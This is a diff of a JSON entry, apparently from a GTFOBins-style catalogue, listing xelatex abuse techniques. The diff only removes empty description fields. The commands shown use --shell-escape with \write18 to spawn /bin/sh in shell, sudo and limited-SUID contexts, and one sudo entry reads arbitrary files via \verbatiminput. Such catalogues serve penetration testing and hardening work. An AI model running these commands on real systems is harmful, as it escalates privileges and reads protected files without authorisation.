@@ -2,7 +2,7 @@
   "functions": {
     "shell": [
       {
-        "description": "",
+        
         "code": "xelatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'\n"
       }
     ],
@@ -18,13 +18,13 @@
         "code": "sudo xelatex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{file_to_read}\\end{document}'\nstrings article.dvi\n"
       },
       {
-        "description": "",
+        
         "code": "sudo xelatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'\n"
       }
     ],
     "limited-suid": [
       {
-        "description": "",
+        
         "code": "./xelatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'\n"
       }
     ]
